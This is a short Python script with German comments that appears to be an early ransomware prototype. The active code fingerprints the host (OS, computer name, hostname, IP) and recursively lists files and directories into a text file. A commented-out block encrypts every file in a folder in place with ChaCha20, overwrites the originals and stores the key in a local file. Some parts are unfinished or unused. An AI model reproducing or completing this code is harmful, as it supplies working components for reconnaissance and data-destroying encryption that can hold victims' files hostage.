import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
from cryptography.hazmat.backends import default_backend
import platform
import socket

def kenndaten():
    kenndaten = open("daten.txt", "w")
    # Betriebssystem
    os_name = platform.system()
    print("Betriebssystem:", os_name)
    kenndaten.write(os_name+"\n")
    # Computername
    computer_name = platform.node()
    print("Computername:", computer_name)
    kenndaten.write(computer_name+"\n")
    # Prozessorinformationen
    processor = platform.processor()
    print("Prozessor:", processor)

    # Hostname
    hostname = socket.gethostname()
    print("Hostname:", hostname)

    # IP-Adresse
    ip_address = socket.gethostbyname(hostname)
    print("IP-Adresse:", ip_address)
    kenndaten.write(ip_address+"\n")
    # CPU-Auslastung




def list_files_directories(path, depth=0):
    if depth > 4:
        return
    
    kenndaten = open("daten.txt","a")
    
    for entry in os.scandir(path):
        if entry.is_file():
            kenndaten.write(entry.path+"\n")
        elif entry.is_dir():
            kenndaten.write(entry.path+"\n")
            list_files_directories(entry.path, depth + 1)



kenndaten()
list_files_directories('../', depth=2)



'''
def encrypt_file_chacha20(key, input_file, output_file):
    # Generiere einen zufälligen Nonce
    nonce = os.urandom(16)

    # Erstellen einer ChaCha20Poly1305-Verschlüsselungsinstanz mit dem Schlüssel und Nonce
    cipher = Cipher(algorithms.ChaCha20(key, nonce), mode=None, backend=default_backend()).encryptor()

    # Lesen des Inhalts der Eingabedatei
    with open(input_file, 'rb') as file:
        plaintext = file.read()

    # Verschlüsseln der Daten
    ciphertext = cipher.update(plaintext) + cipher.finalize()

    # Schreiben von Nonce und verschlüsselten Daten in die Ausgabedatei
    with open(output_file, 'wb') as file:
        file.write(nonce + ciphertext)


key = os.urandom(32)  # Erzeuge einen zufälligen 256-Bit-Schlüssel

with open("chkey.txt", "wb") as keyfile:
    keyfile.write(key)

for file in os.walk('encryptme/'):
    files = file[2]

for i in files:
    input_file = "encryptme/"+i
    output_file = "encryptme/"+i
    encrypt_file_chacha20(key, input_file, output_file)

'''

